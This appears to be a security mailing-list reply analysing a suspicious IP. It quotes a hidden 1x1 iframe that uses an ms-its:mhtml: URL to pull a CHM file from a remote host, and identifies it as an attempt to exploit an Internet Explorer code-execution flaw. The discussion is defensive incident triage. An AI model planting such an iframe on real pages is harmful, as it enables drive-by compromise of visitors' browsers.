Subject: Re: New worm?


I checked out this IP, and saw the following::
<iframe 
src="ms-its:mhtml:file://c:\Css.MHT!http://69.157.174.169:2233//chm2.chm::/rundl.html" 
length="1" height="1"></iframe>

This leads me to believe it may a malicious website setup in an attempt 
to exploit a flaw in IE that was discovered last month ("MSIE 
Unspecified File Processing Arbitrary Code Execution Vulnerability")and 
not a worm.  You can get more info on it here:

Good call alerting the ISP.  Hopefully they'll knock it offline pretty 
quick.
